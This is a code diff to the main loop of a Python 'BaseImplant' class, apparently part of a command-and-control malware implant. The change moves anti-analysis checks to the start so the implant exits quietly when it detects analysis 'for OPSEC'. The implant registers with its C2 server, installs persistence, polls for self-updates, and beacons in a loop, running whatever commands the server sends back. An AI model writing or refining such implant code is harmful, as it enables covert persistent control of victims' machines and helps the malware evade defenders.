@@ -401,34 +401,39 @@ class BaseImplant:
     
     async def async_run(self):
         """Async main implant loop with safety checks and C2 integration"""
+
+        # 🔐 Anti-analysis BEFORE anything else (OPSEC-first)
+        if not self.anti_analysis.should_continue():
+            self.logger.warning("Analysis detected on startup; exiting for OPSEC")
+            return
+
         # Health check before loop
         if not await self.health_check_channel():
             sys.exit(1)
-        
+
         # Initial registration with C2
         await self.register_with_c2()
-        
-        if not self.anti_analysis.should_continue():
-            sys.exit(1)
-            
+
+        # Install persistence (but only after clean anti-analysis gate)
         self.install_persistence()
-        
-        # Background update polling if enabled
+
+        # Background update polling
         if self.config.get('self_update', False):
             asyncio.create_task(self._periodic_update_poll())
-        
+
+        # 🔁 Main loop
         while True:
             try:
-                # Safety check
+                # Runtime anti-analysis check
                 if not self.anti_analysis.should_continue():
+                    self.logger.warning("Runtime analysis detected; cleaning up and exiting")
                     self.cleanup()
-                    break
-                
+                    return
+
                 self.beacon_count += 1
-                
-                # Send beacon
+
+                # Beacon
                 if await self.channel.beacon():
-                    # Check for commands
                     response = await self.channel.receive_response(self.implant_id)
                     if response and response.get('type') == 'command':
                         self.execute_command(response)
@@ -436,16 +441,15 @@ class BaseImplant:
                         self.scheduler.record_success()
                 else:
                     self.scheduler.record_failure()
-                
-                # Adaptive sleep (non-blocking)
+
                 await asyncio.sleep(self.scheduler.calculate_delay())
-                
+
             except KeyboardInterrupt:
                 break
             except Exception as e:
                 self.logger.error(f"Implant error: {e}")
                 self.scheduler.record_failure()
-                await asyncio.sleep(300)  # Emergency backoff
+                await asyncio.sleep(300)
     
     async def _periodic_update_poll(self):
         """Background task: Poll C2 for updates every N beacons"""
